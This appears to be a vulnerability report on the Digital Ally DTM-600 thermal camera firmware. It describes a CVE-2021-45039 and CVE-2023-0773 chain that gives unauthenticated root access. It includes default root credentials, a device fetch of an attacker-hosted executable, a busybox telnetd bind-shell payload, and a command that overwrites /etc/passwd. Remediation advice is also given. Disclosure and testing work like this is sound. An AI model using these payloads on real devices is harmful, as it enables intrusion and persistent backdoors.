Title: Uniview-based DTM-600 RCE + Restricted Shell Escape  
Affected Artifact: Digital Ally ThermoVu DTM-600 (OET-213H-NB) firmware QPTS-B2209.3.70.CEN001.200707  
SHA256: not collected  
Short Description: Maint daemon overflow (CVE-2021-45039) plus updatecpld FTP exec (CVE-2023-0773) yields remote code execution; telnet shell via default creds or spawned telnetd.  
Impact (concise): Remote unauthenticated code execution; practical root shell via default root creds or attacker-spawned telnetd; persistent telnet backdoor.  
Vulnerable Code Snippet: /program/bin/maintain (UDP/7788 overflow, CVE-2021-45039); /program/bin/updatecpld.sh ftpget execution of attacker-supplied cpldload (CVE-2023-0773). Binary hashes not yet captured.  
Reproduction Steps:  
1) Attacker host 192.168.30.11.  
2) Run UDP 7788 exploit (`dtm-600/exploit_udp_7788.py`) to spawn telnetd on port 23 (root/123456 default) or reuse existing telnet.  
3) From telnet uvsh: `updatecpld 192.168.30.11` while attacker FTP (anonymous) serves executable `cpldload`.  
Proof of Concept:  
`cpldload` payload example:  
```
#!/bin/sh
/bin/busybox telnetd -p 2323 -l /bin/sh
```  
Alternate payload: `echo root:dIkAjCy0Zma2s:0:0:Linux User,,,:/root:/bin/sh > /etc/passwd` to reset login.  
Observed Output / Evidence: FTP log shows RETR of `cpldload`; uvsh shows updatecpld fetch; telnet connects to 192.168.30.178:2323 (or 23 after passwd reset) with root/root into unrestricted `/bin/sh`.  
Remediation: Patch/disable maint UDP/7788; remove or harden updatecpld ftpget exec path; disable telnetd; enforce authenticated firmware/config transfers; upgrade to vendor-fixed firmware.  
Severity: CVSSv3 base 10.0 (unauth RCE).  
Likelihood: High (public exploit chain; anonymous FTP fetch).  
Tools & Versions: `dtm-600/exploit_udp_7788.py`; pyftpdlib FTP server; busybox telnetd.  
Coverage Evidence: Confirmed on QPTS-B2209.3.70.CEN001.200707 (OET-213H-NB).  
Notes: Restore `/sbin/reboot` if moved (`mv /sbin/reboot.org /sbin/reboot`); clean `/etc/passwd` after testing; disable extra telnet if not needed.  
